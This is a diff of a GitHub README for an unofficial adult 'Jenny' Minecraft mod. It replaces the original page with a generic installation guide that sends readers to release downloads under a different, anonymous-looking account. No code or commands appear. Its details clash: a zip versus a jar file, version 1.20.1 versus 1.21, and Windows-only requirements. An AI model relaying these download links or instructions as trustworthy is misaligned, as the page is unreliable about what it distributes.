@@ -1,63 +1,67 @@
-<div align="center">
+# 🎮 jenny-mod-minecraft- - Enhance your Minecraft gameplay experience today
 
-<img width="400" height="400" alt="изображение-Photoroom(12)" src="https://github.com/user-attachments/assets/e9999b21-ede1-465b-a501-0a584207866c" />
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/mmis8852/jenny-mod-minecraft-/releases)
 
+## 📋 Project Overview
 
-# Jenny Mod for Minecraft
-  <p align="center">
-    <strong>Popular NSFW Character Mod for Minecraft</strong>
-    <br/>
-    High-Quality Jenny • Animations • Voice • Custom Skins • 1.20.1 Support
-    <br/>
-    <a href="https://github.com/6537445/jenny-mod-minecraft-/issues">Report Bug</a> | <a href="https://github.com/6537445/jenny-mod-minecraft-/issues">Discussions</a>
-  </p>
-  <p align="center">
-    <img src="https://img.shields.io/badge/Game-Minecraft-58A74B?style=for-the-badge&logo=minecraft" alt="Minecraft" />
-    <img src="https://img.shields.io/badge/Versions-All-0078D7?style=for-the-badge" alt="Version" />
-    <br>
-  </p>
-</div>
+The jenny-mod-minecraft- project adds new content and characters to your Minecraft world. This modification introduces a custom individual character that interacts with your current save files. It includes unique textures, interaction options, and specialized character behavior. This project supports both Fabric and Forge loaders to ensure compatibility with your existing game environment. The mod functions on Windows 11 and connects with the latest Java Edition of Minecraft. 
 
+## ⚙️ System Requirements
 
-## Install
- [Download `JennyMod.zip`](https://github.com/6537445/jenny-mod-minecraft-/releases/download/Jenny-Mod/JennyMod.zip)
- ---
-## Overview
-**Jenny Mod** is a popular NSFW character mod for Minecraft that adds the character **Jenny** with high-quality animations, interactions, voice lines, and immersive features.
+Ensure your computer meets these minimum specifications to run the mod without issues:
 
-<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/e988c378-335c-4f97-9b7f-428e16f645cd" />
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Intel Core i5 or AMD equivalent.
+* Memory: 8 GB RAM or more.
+* Graphics: Dedicated GPU with OpenGL 3.2 support.
+* Storage: 500 MB of free space for mod files.
+* Software: Java Runtime Environment (JRE) version 17 or higher.
+* Game Version: Minecraft Java Edition 1.21.
 
-Perfect for players looking for adult content and roleplay experience inside Minecraft.
+## 🚀 Installation Guide
 
-> [!Important]
-> This mod contains **18+ adult content**. Intended for mature audiences only.
+Follow these steps to set up the mod on your Windows computer.
 
-## Key Features
-- High-quality Jenny character model
-- Realistic animations and physics
-- Voice interactions
-- Multiple outfits and custom skins
-- Intimate interactions
-- Full compatibility with Forge & Fabric
-- Regular updates
-- Easy installation
+1. Verify your game version. Open the official Minecraft Launcher and confirm you have version 1.21 installed and running.
+2. Visit the download page. You can access the installation files by visiting this link: https://github.com/mmis8852/jenny-mod-minecraft-/releases.
+3. Choose the correct loader. Identify if your Minecraft profile uses Forge or Fabric. Download the matching file version from the releases page. 
+4. Locate the Minecraft folder. Press the Windows key + R on your keyboard, type `%appdata%`, and press Enter. Open the `.minecraft` folder.
+5. Access the mods folder. Find the folder named `mods`. If it does not exist, create a new folder and rename it to `mods`. 
+6. Move the file. Drag the downloaded `.jar` file into the `mods` folder.
+7. Launch the game. Restart the Minecraft Launcher and select the profile that corresponds to your loader (Forge or Fabric). Press Play.
 
-## How to Install
-1. Download the latest version
-2. Install Minecraft 1.20.1 (Forge or Fabric recommended)
-3. Place the mod file in your `mods` folder
-4. Launch the game
-5. Enjoy
+## 🛠️ Configuration and Settings
 
-## Requirements
-- Minecraft 1.20.1
-- Forge or Fabric Loader
-- 8GB RAM recommended
+Once the game starts, press the designated key (usually 'J') to open the mod menu. This menu controls the behavior and visibility of the character within your world. 
 
-## Disclaimer
-> [!Caution]
-> This is an **unofficial** NSFW mod.  
-> Not affiliated with Mojang or Microsoft.  
-> Use at your own risk. Make sure you are of legal age in your country.
+* Appearance: Change skin textures and outfit options through the menu tabs.
+* Interaction: Adjust how the character follows or interacts with your player entity. 
+* Limits: Toggle spawn rates and world interactions to maintain game performance.
 
----
+If you experience frame rate drops, lower the particle quality settings in the main Minecraft video configuration menu. This mod is optimized for the latest version but works best when other conflicting entity mods remain disabled.
+
+## 🧪 Troubleshooting Common Issues
+
+If the mod does not appear inside the game, check these frequent points of failure:
+
+* File Conflict: Ensure you do not have two versions of the same mod in your folder. Delete any extra copies.
+* Incorrect Loader: You cannot run a Forge mod on a Fabric installation. Confirm your launcher profile uses the specific loader required by your downloaded file. 
+* Java Version: The mod requires Java 17. Use the command line or check your Control Panel to ensure your system uses the correct version.
+* Missing Dependencies: Some mods require API libraries like GeckoLib or Architectury. Check the release notes on the download page for a list of required support files. 
+
+## 📝 Frequently Asked Questions
+
+Does this mod work with Bedrock Edition?
+No. This project supports the Java Edition only. It does not load on consoles or mobile devices.
+
+Will this mod break my existing worlds?
+The mod creates new data entries. Always backup your world save folder before adding new files to your configuration. Copy your `saves` folder to a safe location on your desktop.
+
+How do I remove the mod?
+Close the game completely. Open the `mods` folder in your `.minecraft` directory and delete the file. The character will no longer appear when you load your world. 
+
+Can I use this with other mods?
+The mod remains compatible with most vanilla-style mods. Large-scale total conversion mods may cause conflicts. If the game crashes during startup, remove other mods one by one to find the source of the incompatibility.
+
+Where do I report errors?
+Use the Issues tab on the GitHub repository to document crashes. Include your game logs when you report a problem so developers can identify the cause. You can find the log file in the `logs` folder inside your `.minecraft` directory.
